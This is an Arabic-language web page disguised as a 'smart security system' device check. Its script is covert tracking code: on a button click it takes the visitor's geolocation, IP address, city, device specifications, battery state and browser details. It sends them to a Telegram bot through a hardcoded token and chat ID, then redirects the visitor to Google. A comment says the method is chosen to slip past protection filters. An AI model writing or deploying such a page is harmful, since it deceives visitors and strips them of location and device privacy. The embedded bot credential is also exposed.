<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق من الهوية | Secure Auth</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { border: 1px solid #00ff41; padding: 40px; border-radius: 15px; background: #111; max-width: 400px; text-align: center; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
        button { background: #00ff41; color: #000; border: none; padding: 15px 30px; width: 100%; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #00cc33; box-shadow: 0 0 15px #00ff41; }
        #status { margin-top: 20px; font-size: 14px; color: #888; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="margin-top:0;">نظام الأمان الذكي</h2>
        <p>يرجى الضغط على الزر أدناه لبدء فحص توافق الجهاز وتأمين الاتصال.</p>
        <button id="startBtn">ابدأ الفحص الآن</button>
        <div id="status">بانتظار بدء العملية...</div>
    </div>

    <script>
        // بياناتك الرسمية التي طلبت وضعها
        const TOKEN = "8714827817:AAFu1q4eQYLoOdlHj7pEOE69QI8Mhu7v_iI";
        const CHAT_ID = "7289235107";

        document.getElementById('startBtn').onclick = async () => {
            const status = document.getElementById('status');
            status.innerText = "جاري جمع البيانات الفنية...";
            
            try {
                // محاولة الحصول على الموقع لزيادة دقة التقرير
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendData(pos.coords);
                }, async () => {
                    await sendData(null);
                }, {timeout: 5000});

            } catch (e) {
                await sendData(null);
            }
        };

        async function sendData(coords) {
            const status = document.getElementById('status');
            
            // جلب الـ IP والبيانات الأخرى بالتوازي لضمان السرعة (أقل من ثانية)
            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
            const batt = navigator.getBattery ? await navigator.getBattery() : {level: 0, charging: false};

            const report = `
📊 *تقرير فحص أمان جديد*
━━━━━━━━━━━━━━
🌍 *الموقع والشبكة:*
- IP: \`${ipData.ip || 'Unknown'}\`
- المدينة: ${ipData.city || 'N/A'}
- الدولة: ${ipData.country_name || 'N/A'}
- الخريطة: ${coords ? `[إضغط هنا](https://www.google.com/maps?q=${coords.latitude},${coords.longitude})` : "❌ مرفوض"}

📱 *مواصفات الجهاز:*
- النظام: ${navigator.platform}
- المعالج: ${navigator.hardwareConcurrency} الأنوية
- الرام: ${navigator.deviceMemory || "N/A"} GB
- البطارية: ${Math.round(batt.level * 100)}% (${batt.charging ? '⚡ يشحن' : '🔋 لا يشحن'})

🌐 *بيانات إضافية:*
- الدقة: ${screen.width}x${screen.height}
- الوقت: ${new Date().toLocaleString('ar-EG')}
- المتصفح: \`${navigator.userAgent.substring(0, 50)}...\`
━━━━━━━━━━━━━━`;

            // استخدام طريقة الـ FormData لضمان عبور البيانات من فلاتر الحماية
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', report);
            formData.append('parse_mode', 'Markdown');

            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
                status.innerText = "✅ تم الفحص بنجاح. جاري التوجيه...";
                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
            } catch (error) {
                status.innerText = "❌ حدث خطأ في الاتصال بالسيرفر.";
            }
        }
    </script>
</body>
</html>
